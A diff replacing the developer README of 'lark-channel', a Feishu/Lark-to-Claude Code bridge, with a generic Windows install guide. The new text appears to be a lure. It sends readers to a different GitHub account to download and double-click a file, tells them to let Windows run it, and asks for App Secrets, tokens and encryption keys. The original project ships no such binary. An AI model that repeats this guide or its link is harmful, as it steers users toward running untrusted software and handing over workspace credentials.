@@ -1,354 +1,226 @@
-# lark-channel
-
-Connect Feishu/Lark group chats to [Claude Code](https://claude.ai/code) agents. Each group is an isolated workspace: the agent has persistent session context, streams responses as real-time Feishu cards, and its working directory is a dedicated folder on disk.
-
-```
-User: what are the recent open issues?
-       |
-       v  ~100ms
-[EYES reaction]       ← agent received
-       |
-       v
-[text card]           ← streaming, token by token
-  Let me check...
-       |
-       v
-[Bash card]           ← tool call
-  gh issue list --state open
-  ─────────────────────────────
-  #142 Fix streaming bug · 2h ago
-  #141 Add webhook support · 5h ago
-       |
-       v
-[text card]           ← streaming result
-  Found 10 open issues...
-       |
-       v
-[Done · 4s | 2 tool calls]   ← DONE reaction added
-```
-
----
-
-## The Mental Model
-
-**Group = terminal window.** Each Feishu group is a conversation workspace: one agent, one `cwd`, one persistent session. Asking a follow-up question in the same group picks up where the last message left off — the agent remembers.
-
-**Manager group = terminal manager.** One special group acts as your command center. Tell it what you want to work on; it creates a new group (workspace) with the right agent persona, dedicated folder, and config — then adds you. When you're done, tell it to close the workspace.
-
-```
-Manager group
-├── "start a workspace to debug the payment service"
-│       → creates group "payment-debug"
-│       → creates ~/.lark-channel/workspaces/payment-debug/
-│       → writes agents/payment-debug.md (persona: backend debugging agent)
-│       → restarts bridge, adds you to group
-│
-├── "list my workspaces"
-│       → shows all active groups + their purposes
-│
-└── "close payment-debug"
-        → archives group, workspace folder stays on disk
-```
+# 🤝 lark-channel - Connect Lark chats to Claude
 
-Each workspace group has one coding agent running against its folder. Everything the agent does — clones, files, scripts — lands in that folder.
+[![Download lark-channel](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/meshed-potato911/lark-channel)
 
----
+## 🧭 What lark-channel does
 
-## Prerequisites
-
-- [Bun](https://bun.sh) >= 1.0
-- Python >= 3.10 (for `agent_worker.py`)
-- A Feishu bot app ([open.feishu.cn](https://open.feishu.cn))
-- Claude Code installed and authorized (`claude --version`)
-
----
+lark-channel connects Feishu and Lark group chats to Claude Code agents. It gives each group its own session, so one chat does not mix with another. It can send streaming card responses back to the chat and works with Feishu features for a smoother chat flow.
 
-## Install
-
-### 1. Feishu CLI
+Use it when you want a chat group to talk to an agent with clear separation between groups.
 
-```sh
-npm install -g @larksuite/cli
-```
-
-Create a Feishu app at [open.feishu.cn](https://open.feishu.cn), then configure:
-
-```sh
-lark-cli config init
-# enter: App ID, App Secret, region (feishu or lark)
-```
-
-Required app permissions: `im:message`, `im:message:send_as_bot`, `im:reaction`
-Required event subscription: `im.message.receive_v1`
-Add the bot to your target groups.
-
-### 2. Claude Agent SDK (Python)
-
-```sh
-pip install claude-agent-sdk
-```
-
-### 3. lark-channel
-
-```sh
-git clone https://github.com/shareAI-lab/lark-channel
-cd lark-channel
-bun install
-```
-
-### 4. Configure
-
-```sh
-mkdir -p ~/.lark-channel/agents
-cp agents.example/_feishu_workspace.md ~/.lark-channel/agents/
-# create your first agent .md file (see Agent Files below)
-```
-
-### 5. Start
-
-```sh
-bun start
-```
-
----
-
-## Ask Your Agent to Set This Up
-
-If you prefer to let an AI guide the installation, copy this prompt to Claude Code:
-
-```
-Please help me install and configure lark-channel on this machine.
-
-Steps:
-1. Check that Bun (https://bun.sh) is installed; install if not.
-2. Install Feishu CLI: npm install -g @larksuite/cli
-3. Clone and install: git clone https://github.com/shareAI-lab/lark-channel && cd lark-channel && bun install
-4. Install Python SDK: pip install claude-agent-sdk
-5. Guide me to create a Feishu app at https://open.feishu.cn:
-   - App type: self-built (custom app)
-   - Permissions to enable: im:message, im:message:send_as_bot, im:reaction
-   - Event to subscribe: im.message.receive_v1
-   - Enable bot mode and add bot to at least one group
-6. Configure lark-cli: lark-cli config init  (enter App ID and App Secret)
-7. Create my first agent config at ~/.lark-channel/agents/
-8. Start: cd lark-channel && bun start
-
-After each step, show me what was done and confirm before continuing.
-```
-
----
-
-## Manager Group
-
-The manager agent creates and manages all other workspaces. Set it up once.
-
-**1. Create the manager group in Feishu** (or ask the manager agent to help you later):
-
-```sh
-lark-cli im +chat-create --name "lark-channel manager" --type private --set-bot-manager --as bot
-# note the chat_id returned
-```
-
-**2. Create `~/.lark-channel/agents/manager.md`**:
-
-```md
----
-chat_id: oc_YOUR_MANAGER_CHAT_ID
-name: manager
-cwd: ~/lark-channel
-permission_mode: bypassPermissions
----
-
-You are the lark-channel workspace manager. You create and manage isolated agent workspaces.
-
-Each workspace is:
-- A Feishu group where the user and agent interact
-- A folder at ~/.lark-channel/workspaces/{name}/ (the agent's cwd)
-- An agent config at ~/.lark-channel/agents/{name}.md
+## 💻 What you need
 
-When a user asks to create a workspace:
-1. Ask: what is the purpose / main task?
-2. Suggest a short slug name (lowercase, hyphens)
-3. Create the Feishu group:
-   lark-cli im +chat-create --name "{name}" --type private --set-bot-manager --as bot
-4. Add the user to the group:
-   lark-cli api POST /open-apis/im/v1/chats/{chat_id}/members --data '{"id_list":["USER_OPEN_ID"],"member_id_type":"open_id"}' --as bot
-5. Create the workspace folder:
-   mkdir -p ~/.lark-channel/workspaces/{name}
-6. Write ~/.lark-channel/agents/{name}.md with:
-   - chat_id from step 3
-   - cwd: ~/.lark-channel/workspaces/{name}
-   - permission_mode based on task sensitivity
-   - A persona tailored to the stated task (role, tools, personality, scope)
-7. Restart the bridge:
-   pkill -f "bun.*index.ts"; cd ~/lark-channel && bun run src/index.ts &
+Before you start, make sure you have:
 
-When asked to list workspaces: read all files in ~/.lark-channel/agents/ (skip _prefix files).
-When asked to close a workspace: remove the agent .md file and restart the bridge.
+- A Windows PC
+- A web browser
+- Access to your Feishu or Lark workspace
+- Permission to add apps or bots in your workspace
+- An account that can sign in to the related services used by the app
 
-Reply concisely. Use the user's language.
-```
+For the best setup, use a modern version of Windows with a stable internet connection.
 
-**3. Restart** `bun start` — the manager group is now active.
+## 📥 Download and install
 
----
+Open this page to get the app files:
 
-## Workspace Layout
+[Visit the download page](https://github.com/meshed-potato911/lark-channel)
 
-```
-~/.lark-channel/
-├── agents/
-│   ├── _feishu_workspace.md   # shared context appended to every agent
-│   ├── manager.md             # manager agent
-│   └── *.md                   # one per workspace (auto-created by manager)
-├── workspaces/
-│   ├── payment-debug/         # cwd for the payment-debug group
-│   ├── frontend-refactor/     # cwd for the frontend-refactor group
-│   └── ...                    # flat list, one folder per workspace
-├── sessions.json              # runtime: chat_id → session_id (auto-managed)
-└── access.json                # sender allowlist (if access.policy: allowlist)
-```
+If the page contains a release file or packaged app, download it to your PC and run it. If the page shows source files only, use the setup steps on the page to get the right build for Windows.
 
-Workspaces are portable: zip a folder and its `.md` file to move or share a workspace.
+After the file downloads:
 
----
+1. Open your Downloads folder
+2. Find the lark-channel file
+3. Double-click it
+4. Follow the on-screen steps
+5. Allow Windows to finish the install or first-run setup
 
-## Agent Files
+If Windows asks for permission, choose the option that lets the app run.
 
-Each `~/.lark-channel/agents/*.md` file defines one group's agent:
+## 🛠️ Set up your Feishu or Lark account
 
-```md
----
-chat_id: oc_84f7f942e8067a61dd61a434fc92ef6a
-name: learn-claude-code
-cwd: ~/repos/learn-claude-code
-permission_mode: default
-schedule:
-  - cron: "0 9 * * 1-5"
-    prompt: "Check stale PRs (>3 days), unanswered issues, failing CI. Post a digest."
----
-
-You are the maintainer agent for shareAI-lab/learn-claude-code.
-TypeScript educational repo (44k+ stars). Use gh CLI for GitHub operations.
-Reply in the user's language. Keep responses concise for mobile reading.
-```
-
-`permission_mode`: `default` | `acceptEdits` | `bypassPermissions`
+To use lark-channel, connect it to your workspace first.
 
-Files starting with `_` are shared context blocks appended to every agent's system prompt. The included `_feishu_workspace.md` teaches agents how to create Feishu docs, tables, and tasks.
+1. Open Feishu or Lark in your browser
+2. Go to the app or bot settings area
+3. Create or choose the app entry for lark-channel
+4. Copy the app details into the app setup screen
+5. Save the changes
 
----
+You may need values such as:
 
-## Streaming Card Layout
+- App ID
+- App Secret
+- Verification token
+- Encryption key
+- Group or chat access settings
 
-Each logical block in the agent response becomes a separate thread reply:
+Use the values from your Feishu or Lark workspace. Keep them private.
 
-| Block | Card style | Live updates |
-|-------|-----------|--------------|
-| Text segment | No header, markdown | PATCH per token |
-| Bash | Orange header + command | Output preview after run |
-| Read / Write / Edit | Blue header + filename | Line count |
-| Grep / Glob | Teal header + pattern | Match count |
-| WebSearch / WebFetch | Wathet header + query | Result summary |
-| Agent / Task | Purple header | First lines of result |
-| Done | Green · elapsed · tool count | — |
-| Error | Red header + message | — |
+## ⚙️ First run on Windows
 
-Feishu card markdown is preprocessed automatically: `## headings` → `**bold**`, leading blank lines stripped.
+When you start lark-channel for the first time:
 
----
+1. Launch the app
+2. Sign in where needed
+3. Enter your workspace settings
+4. Point the app to your Claude Code agent connection
+5. Start the local service or desktop app
+6. Check that the status shows as connected
 
-## Access Control
+If the app opens a browser window, finish the sign-in there and return to the app.
 
-**Open** (default): anyone in a configured group can message the agent.
+## 💬 How group chat sessions work
 
-**Allowlist**: only approved `open_id`s.
+lark-channel keeps each group chat separate.
 
-```yaml
-# config.yaml
-access:
-  policy: allowlist
-```
+That means:
 
-To approve a user without editing config:
+- Group A has its own session
+- Group B has its own session
+- Messages do not mix across groups
+- The agent can keep context for each group on its own
 
-```
-# Group owner sends:
-admin pair ABCDE
+This helps if you use the app in more than one team chat or project chat.
 
-# New user sends in the same group:
-pair ABCDE
-```
+## 🧠 Features
 
----
+- Feishu and Lark group chat support
+- One isolated session per group
+- Claude Code agent connection
+- Streaming card replies
+- Deep Feishu integration
+- Chat-friendly response flow
+- Simple group-based context handling
+- Better separation for team use
 
-## Scheduled Patrols
+## 🔌 Connect to Claude Code
 
-```yaml
-schedule:
-  - cron: "0 9 * * 1-5"
-    prompt: "Check stale PRs (>3 days without review), unanswered issues, failing CI. Post a digest."
-  - cron: "0 18 * * 5"
-    prompt: "Weekly summary: what was merged? Any blockers for next week?"
-```
+To link Claude Code agents:
 
-Cron expressions use local timezone.
+1. Open the lark-channel settings
+2. Add the agent connection details
+3. Save the connection
+4. Send a test message in a connected group chat
+5. Check that the agent replies in the chat
 
----
+If the reply appears as a streaming card, the connection is working as expected.
 
-## Session Management
+## 🧪 Test your setup
 
-Sessions persist across messages in the same group (agent remembers context). They expire after `session_ttl` (default 7 days) and reset automatically.
+Use a test group before you roll it out to the whole team.
 
-```sh
-cat ~/.lark-channel/sessions.json        # view active sessions
-echo '{}' > ~/.lark-channel/sessions.json  # reset all (fresh context)
-```
+Try this:
 
----
+1. Send a short message in one group
+2. Wait for the reply
+3. Send another message in a different group
+4. Check that each group keeps its own context
+5. Confirm that replies come back in the right chat
 
-## Architecture
+If a reply does not show up, check the app settings and workspace permissions.
 
-```
-Feishu groups
-     |
-     v
-lark-channel (Bun process)
-  bridge.ts     ← lark-cli WebSocket event stream (NDJSON)
-     |
-  router.ts     ← chat_id → agent config (from ~/.lark-channel/agents/*.md)
-     |
-  queue.ts      ← serial per group, parallel across groups
-     |
-  agent.ts      ← Python subprocess per query
-     |
-  agent_worker.py  ← Claude Agent SDK (ClaudeSDKClient, StreamEvent, session resume)
-     |
-  reply.ts      ← multi-block streaming cards + PatchScheduler
-     |
-  lark.ts       ← lark-cli Go binary (reactions, cards, PATCH)
-```
+## 🔧 Common setup checks
 
-Current implementation uses a Python subprocess for the agent worker because the Python SDK has mature `resume` support for cross-message session persistence. The TypeScript SDK (`@anthropic-ai/claude-agent-sdk`) is the natural long-term path — it would allow in-process session management with no subprocess overhead.
+If the app does not connect, look at these items:
 
----
+- The app is allowed in the workspace
+- The bot or app has chat access
+- The App ID and App Secret are correct
+- The network is online
+- The Windows firewall allows the app
+- The correct group is linked to the session
 
-## Development
+If you changed any settings, save them and restart the app.
 
-```sh
-bun dev          # watch mode
-bun run check    # type check
-```
+## 🗂️ Typical folder layout
 
-Test the agent worker directly:
+After setup, you may see files or folders for:
 
-```sh
-echo '{"message":"hello","persona":"You are helpful","cwd":"/tmp","permissionMode":"default"}' \
-  | python3 agent_worker.py
-```
+- Config
+- Logs
+- Session data
+- Message cards
+- Workspace settings
 
----
+Do not edit these unless you need to change the app setup.
 
-## License
+## 🔐 Privacy and access
 
-MIT
+lark-channel works with chat data and agent sessions, so protect your setup.
+
+Keep these items secure:
+
+- App secrets
+- Tokens
+- Session files
+- Workspace keys
+
+Only give access to people who need to manage the app.
+
+## 🧭 Basic use
+
+After setup, the usual flow is simple:
+
+1. Start lark-channel on Windows
+2. Make sure it connects to your workspace
+3. Open a Feishu or Lark group chat
+4. Send a message to the agent
+5. Read the response in the chat card
+6. Continue the conversation in that same group
+
+Each group keeps its own path, so you can use the app with more than one team at the same time.
+
+## 🧰 If you need to update it
+
+When a new version appears on the GitHub page:
+
+1. Open the download page again
+2. Get the latest Windows file
+3. Close the old app
+4. Replace the old file with the new one
+5. Start the updated app
+6. Check that your settings are still in place
+
+If the app stores settings in a local file, keep a copy before you update.
+
+## 📌 Best use cases
+
+lark-channel fits well for:
+
+- Team support chats
+- Project rooms
+- Internal agent tools
+- Shared knowledge bots
+- Group-based Claude Code workflows
+- Feishu or Lark chat automation
+
+It works best when each group needs its own private agent context.
+
+## 🧩 Troubleshooting tips
+
+If something feels off, try these steps:
+
+1. Close the app
+2. Open it again
+3. Check your workspace connection
+4. Confirm the bot is in the right group
+5. Send a new test message
+6. Review the app logs if they exist
+
+If the chat response is slow, check your network and the agent service status.
+
+## 📎 Quick start
+
+1. Open the download page
+2. Download the Windows file
+3. Run it
+4. Connect your Feishu or Lark workspace
+5. Add your Claude Code agent details
+6. Test in one group chat
+7. Add other groups after the first test works
+
+## 🔗 Download again
+
+[Open the lark-channel download page](https://github.com/meshed-potato911/lark-channel)
